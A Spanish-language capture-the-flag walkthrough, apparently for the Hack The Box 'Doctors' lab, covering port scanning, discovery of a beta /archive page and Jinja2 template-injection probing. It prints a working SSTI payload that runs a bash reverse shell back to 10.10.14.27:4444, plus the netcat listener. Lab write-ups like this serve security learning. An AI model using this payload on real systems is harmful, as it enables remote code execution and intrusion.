### NMAP
```
nmap -p- -Pn -sS -sV 10.129.2.21
```
![](Pasted%20image%2020260114201901.png)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
8089/tcp open  ssl/http Splunkd httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### WEB
Al accceder a la web se observa que hay una referancia a al dominio doctors.htb
![](Pasted%20image%2020260115173833.png)
Modificamos la ruta /etc/hosts para añadir el dominio
```
nano /etc/hosts
10.129.2.21 doctors.htb
```
![](Pasted%20image%2020260115173858.png)

Accedemos a http://doctors.htb y nos redirige a una ventana de login
![](Pasted%20image%2020260115174019.png)
Creamos una cuenta 
![](Pasted%20image%2020260115174051.png)
Accedemos al portal del usuario y probamos a crear una publicación
![](Pasted%20image%2020260115204228.png)
Analizamos el código fuente de la publicación y observamos un comentario indicando que la ruta /archive tiene una funcionalidad en fase beta.
Accedemos a la ruta view-source:http://doctors.htb/archive y observamos una plantilla
![](Pasted%20image%2020260115204558.png)

### SSTI

Procedemos a hacer pruebas para determinar que plantilla se está utilizando
![](Pasted%20image%2020260115204836.png)

Con ${7 * 7} no se interpreta la respuesta esperada por lo que seguimos con el orden.
![](Pasted%20image%2020260115205139.png)
Con {{7 * 7}} si se interpreta el resultado esperado por lo que continuamos con el siguiente payload
![](Pasted%20image%2020260115205116.png)
Con {{7 * '7'}} se interpreta la salida esperada por lo que podemos determinar que la plantilla es Jinja2
![](Pasted%20image%2020260115205538.png)

Procedemos a buscar una shell para la plantilla Jinja2 en el github [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.27/4444 0>&1'").read()}}{%endif%}{%endfor%}
```

Para cargar la shell debemos lanzar un netcat a la escucha en el mismo puerto
```
nc -lvnp 4444
```
![](Pasted%20image%2020260115205943.png)

Cargamos la shell:
![](Pasted%20image%2020260115205923.png)

Al acceder a la URL view-source:http://doctors.htb/archive observamos que se lanza la shell
![](Pasted%20image%2020260115210027.png)
